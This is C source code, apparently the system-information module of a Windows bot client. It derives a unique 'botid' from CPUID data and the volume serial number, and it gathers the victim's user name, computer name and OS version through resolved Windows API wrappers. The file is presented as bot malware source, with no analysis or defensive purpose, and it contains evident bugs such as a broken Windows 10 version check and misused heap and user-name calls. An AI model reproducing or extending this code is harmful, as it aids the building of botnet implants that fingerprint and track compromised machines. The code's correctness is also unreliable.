#include "api.h"
#include "task_reply.h"
#include "md5.h"
#include "misc.h"
#include "info.h"


char *os_info[] = {"Windows NT", "Windows XP/2003", "Windows Vista", "Windows 7/2008", "Windows 8/2012", "Windows 8.1", "Windows 10/2016", "Unknow" };
char *arch_info[] = {" 32bits", " 64bits"};

int os_version = 0;
char *botid;
info l_info;

/*
 * @brief Set information about botid
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
int __set_botid(void) {
	_ZeroMemory(&l_info, sizeof(l_info));

	__get_info(&l_info);

	if(__get_volume_serial(&l_info)!=1)
		return 0xFFFFFFFF;
	
	__get_cpuid(&l_info);
	__get_token(&l_info);

	botid = _HeapAlloc(_GetProcessHeap(), 0x00000008, sizeof(l_info.botid)+10);

	_lstrcpynA(botid, l_info.botid, sizeof(l_info.botid)+1);
//	_ZeroMemory(s_info, sizeof(info));
	return 0;
}


/*
 * @brief Get information about botid
 * @returns botid
 *          0xFFFFFFFF || 0xCCCCCCCC error
 */
char *__get_botid(void) {
	return(botid);
}

/*
 * @brief Get information about system and hardware
 * @param info data struct for information about system
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
int __get_info(info *s_info) {
	int ret = 0;


	if(__get_user_name(s_info)==0)
		ret = 0xFFFFFFFF;
	
	if (__get_computer_name(s_info) == 0)
		ret = 0xFFFFFFFF;

	if(__get_windows_version(s_info)==0)
		ret = 0xFFFFFFFF;

	return(ret);
}


/*
 * @brief Get Token
 * @param info data struct for information about system
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
int __get_token(info *s_info) {
	char *tmp_buff = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);

	_lstrcpynA(tmp_buff, (char *)s_info->cpuinfo, _lstrlenA((char *)s_info->cpuinfo)+1);
	_lstrcatA(tmp_buff, (char *)s_info->volume_serial);

	__get_md5(tmp_buff, (unsigned char *)&s_info->botid);


	_HeapFree(_GetProcessHeap(), 0, tmp_buff);
	return 0;
}


/*
 * @brief Get cpu info
 * @param info data struct for information about system
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
int __get_cpuid(info *s_info)
{	
	unsigned int cpuinfo[4];

	__asm 
	{
		lea edi, cpuinfo
		mov eax, 1
		cpuid  
		mov dword ptr [edi +  0], eax
		mov dword ptr [edi +  4], ebx  
		mov dword ptr [edi +  8], ecx  
		mov dword ptr [edi + 12], edx  
	}

	s_info->cpuinfo = (unsigned char *)_HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);
	_snprintf((char *)s_info->cpuinfo, 1024, "%d%d%d%d", cpuinfo[0], cpuinfo[1], cpuinfo[2], cpuinfo[3]);

	return 0;
}



/*
 * @brief Get volume serial number
 * @param info data struct for information about system
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
int __get_volume_serial(info *s_info) {
	char *sys_drive = (char *)_HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);
	unsigned long serial;
	unsigned short serial_high,serial_low;

	void *final = _LocalAlloc(0x0042, 1024);
	


	if(_GetSystemDirectoryA((unsigned char *)sys_drive, 128)!=0x00) {
		sys_drive[3]=0x00;
		if(_GetVolumeInformationA(sys_drive, 0x00, 0x00, &serial, 0x00, 0x00,0x00,0x00)==0x00) {
			serial=0;
		}
	}

	else {
		serial = 0x00;
	}

	sys_drive[3]='J'; //mark :) The real h4x0r fuckin' this line

	if(sys_drive) {
		_ZeroMemory(sys_drive, 1024);
		_HeapFree((unsigned long *)sys_drive, HEAP_NO_SERIALIZE, NULL);
	}


	s_info->volume_serial = _HeapAlloc(_GetProcessHeap(), 0x00000008, 128+10);

	serial_high = HIWORD(serial);
	serial_low = LOWORD(serial);
	//_StringCbPrintfA(s_info->volume_serial,128,"%X-%X", serial_high, serial_low);
	_snprintf((char *)s_info->volume_serial,128,"%X-%X", serial_high, serial_low);

	
	if(final)
		_LocalFree(final);

	return 0x01;

}


/*
 * @brief Get computer user name
 * @param info data struct for information about system
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
int __get_user_name(info *s_info) {
	unsigned long tmp_len;
	unsigned char tmp[1024];
	char *tmp2;
	int ret = 0;

	//_ZeroMemory(tmp, 1024);
	s_info->user_name = _HeapAlloc(_GetProcessHeap(), 0x00000008, 1024); 
	ret = _GetUserNameA(tmp, &tmp_len);

	if(ret!=0 && tmp_len!=0xCCCCCCCC) {
		_lstrcpynA(s_info->user_name, tmp, tmp_len);
		_ZeroMemory(tmp,sizeof(tmp));	
	}
	
	else {
		tmp2 = _getenv("USERNAME");
		_lstrcpynA(s_info->user_name, tmp2, sizeof(tmp2)+2);
		ret++;
	}

	return(ret);
}


/*
 * @brief Get computer name
 * @param info data struct for information about system
 * @returns 0 success 
 *          0xFFFFFFFF error
 */
int __get_computer_name(info *s_info) {
	unsigned long tmp;
	char buff[1024];
	s_info->computer_name = _HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);
	_ZeroMemory(buff, 1024);
	//return(_GetComputerNameExA(0x06,(unsigned char *)s_info->computer_name, &tmp));
	_GetComputerNameA((unsigned char *)buff, &tmp);
	_lstrcpynA((char *)s_info->computer_name, buff, tmp+1);
	return(0);
}



/*
 * @brief Get windows version
 * @param info data struct for information about system
 * @returns 0 success 
 *          0xFFFFFFFF error
 */

int __get_windows_version(info *s_info) {
	OSVERSIONINFOA os_ver;// = { 0x00 };
	int arch=0x00;
	

	_ZeroMemory(&os_ver, sizeof(OSVERSIONINFOA));
	s_info->os_version = _HeapAlloc(_GetProcessHeap(), 0x00000008, 1024);
	
	os_ver.dwOSVersionInfoSize = sizeof(os_ver);
	if(_GetVersionExA(&os_ver)) {
		/*if(!(os_ver.dwPlatformId == 0x02))
				os_version = 0x0;*/
		if(os_ver.dwMajorVersion == 0x05)
				os_version = 0x01;
        else if(os_ver.dwMajorVersion == 0x06 && os_ver.dwMinorVersion == 0x00)
				os_version = 0x02;
        else if(os_ver.dwMajorVersion == 0x06 && os_ver.dwMinorVersion == 0x01)
				os_version = 0x03;
		else if (os_ver.dwMajorVersion == 0x06 && os_ver.dwMinorVersion == 0x02)
				os_version = 0x04;
		else if (os_ver.dwMajorVersion == 0x06 && os_ver.dwMinorVersion == 0x03)
				os_version = 0x05;
		else if (os_ver.dwMajorVersion == 10 && os_ver.dwMajorVersion == 0x00)
				os_version = 0x06;
        else
				os_version = 0x07;
    }

    if(sizeof(void *)==0x04)
            arch=0x00;
    else
            arch=0x01;


	_lstrcpynA(s_info->os_version, os_info[os_version], _lstrlenA(os_info[os_version])+1);
	_lstrcatA(s_info->os_version, arch_info[arch]); //, _lstrlenA((char *)arch_info[arch]));

	
	return(1);
}
